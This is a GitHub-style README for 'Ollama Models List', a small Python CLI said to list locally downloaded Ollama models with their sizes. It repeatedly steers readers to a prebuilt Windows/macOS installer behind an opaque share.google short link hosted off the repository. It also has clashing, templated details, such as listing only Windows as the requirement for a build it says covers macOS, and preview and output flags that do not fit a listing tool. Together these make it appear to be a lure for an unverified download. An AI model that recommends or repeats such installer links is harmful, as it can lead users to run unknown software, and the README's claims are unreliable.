![Ollama Models List](assets/hero.png)

# Ollama Models List

*What is already pulled on this machine.*

## About

**Ollama Models List** is a developer utility. List models reported by a local Ollama instance and write name plus size.

You forget which weights are on disk.

The CLI is the source of truth. The desktop build is optional if you do not want Python installed.

## How to get it

This GitHub repository is the **Python CLI source** (MIT). Clone it, install requirements, run `main.py`.

A **desktop build for Windows and macOS** (installer, no Python required) is on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8). Same workflow, packaged for everyday use.

## Features

- Name and size
- Optional JSON
- Local host only
- Does not pull

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## CLI

Python 3.11 or newer. From the repository root:

```powershell
pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Install

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/jennifer-4747/ollama-models-list

MIT license. See `LICENSE`.
